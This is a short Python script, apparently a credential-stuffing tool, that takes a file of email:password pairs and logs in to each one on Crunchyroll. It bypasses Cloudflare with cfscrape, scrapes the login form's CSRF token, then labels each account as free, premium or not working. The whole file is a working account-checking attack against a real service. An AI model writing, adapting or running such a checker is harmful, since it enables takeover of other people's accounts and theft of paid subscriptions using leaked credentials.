import cfscrape
from bs4 import BeautifulSoup
import argparse

argparser = argparse.ArgumentParser(description='Crunchyroll Account List Checker.'

                                    )
argparser.add_argument('file',
                       help='inputs Crunchyroll Accounts file in form of email:password')
args = argparser.parse_args()

def check (user, passw):
    sesseion = cfscrape.create_scraper()
    login_page = sesseion.get('https://www.crunchyroll.com/login')

    login_soup = BeautifulSoup(login_page.text,'html5lib' )
    csrftok = login_soup.find(id='login_form__token')['value']

    sesseion.post('https://www.crunchyroll.com/login',
                  data={'login_form[name]': user,
                        'login_form[password]': passw,
                        'login_form[redirect_url]': '/',
                        'login_form[_token]': csrftok})

    membership = sesseion.get('https://www.crunchyroll.com/acct/membership')
    member_soup = BeautifulSoup(membership.text, 'html5lib')

    if member_soup.title.get_text().strip() == 'Crunchyroll -   Account Management':
        if member_soup.find(class_='acct-membership-status').contents[1].find('td').get_text().strip() == 'Free':
            print('free:{}'.format(user+ ':' + passw))

        else:
            print('Premium:{}'.format(user + ':' + passw))
    else:
        print('not working:{}'.format(user + ':' + passw))

with open(args.file) as s:
    for line in s:
        users, passwords = line.split(':')
        check(users.strip(), passwords.strip())


